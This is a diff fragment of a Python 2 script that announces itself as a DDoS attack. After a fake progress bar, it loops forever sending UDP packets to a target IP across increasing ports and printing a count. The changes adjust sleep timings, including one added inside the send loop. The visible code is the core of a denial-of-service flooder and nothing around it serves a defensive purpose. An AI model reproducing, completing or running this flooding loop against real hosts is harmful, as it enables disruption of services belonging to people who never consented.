@@ -41,7 +41,7 @@ time.sleep(5)
 print "[============        ] 68%"
 time.sleep(2)
 print "[===============     ] 75%"
-time.sleep(5)
+time.sleep(1)
 print "[==================  ] 92%"
 time.sleep(2)
 print "[====================] 100%"
@@ -49,11 +49,12 @@ time.sleep(3)
 print "LAUNCHING DDOS-ATACK-KALI-"
 time.sleep(3)
 print "Please wait"
-time.sleep(14)
+time.sleep(4)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
+     time.sleep(4)
      port = port + 1
      print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
      if port == 65534:
